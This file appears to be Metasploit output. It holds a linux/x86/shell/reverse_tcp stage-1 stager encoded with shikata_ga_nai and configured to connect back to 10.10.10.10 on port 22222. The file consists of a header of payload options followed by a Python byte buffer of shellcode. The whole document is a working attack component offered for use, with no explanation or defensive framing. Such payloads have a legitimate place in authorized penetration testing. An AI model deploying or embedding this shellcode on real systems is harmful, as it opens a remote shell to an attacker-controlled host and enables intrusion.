# linux/x86/shell/reverse_tcp - 150 bytes (stage 1)
# https://metasploit.com/
# Encoder: x86/shikata_ga_nai
# VERBOSE=false, LHOST=10.10.10.10, LPORT=22222, 
# ReverseAllowProxy=false, ReverseListenerThreaded=false, 
# StagerRetryCount=10, StagerRetryWait=5, PingbackRetries=0, 
# PingbackSleep=30, PayloadUUIDTracking=false, 
# EnableStageEncoding=false, StageEncoderSaveRegisters=, 
# StageEncodingFallback=true, PrependFork=false, 
# PrependSetresuid=false, PrependSetreuid=false, 
# PrependSetuid=false, PrependSetresgid=false, 
# PrependSetregid=false, PrependSetgid=false, 
# PrependChrootBreak=false, AppendExit=false, 
# MeterpreterDebugLevel=0, RemoteMeterpreterDebugFile=, 
# CreateSession=true
buf =  b""
buf += b"\xbd\x67\xf5\x61\x60\xda\xc4\xd9\x74\x24\xf4\x5e\x29"
buf += b"\xc9\xb1\x1f\x31\x6e\x15\x83\xc6\x04\x03\x6e\x11\xe2"
buf += b"\x92\x9f\x6b\x3e\x6d\xbb\x9b\x5d\xde\x78\x37\xc8\xe2"
buf += b"\xce\xd1\x85\x03\xe3\x9e\x01\x98\x94\x94\x27\x14\x6f"
buf += b"\xc1\x35\x28\x39\xdf\xb3\xc9\xaf\xb9\x9b\x59\x61\x11"
buf += b"\x95\xb8\xc2\x50\x25\xbf\x05\x13\x3f\xf1\xf1\xd9\x57"
buf += b"\xaf\xfa\x21\xa8\xf7\x90\x21\xc2\x02\xec\xc1\x23\xc5"
buf += b"\x23\x85\xc1\x15\xc2\x3b\x22\xb2\x87\x43\x0c\xbc\xf7"
buf += b"\x4b\x6e\x35\x14\x8a\x85\x49\x1a\xee\x56\xe1\xe1\x3c"
buf += b"\xe6\x84\xda\xc7\xf7\xdd\x53\xd6\x61\x53\x47\xa9\x91"
buf += b"\x5e\x08\x4c\x55\x18\x0b\xb0\xb7\x60\x0a\x4e\x38\x90"
buf += b"\xb6\x4f\x38\x90\xc8\x82\xb8"
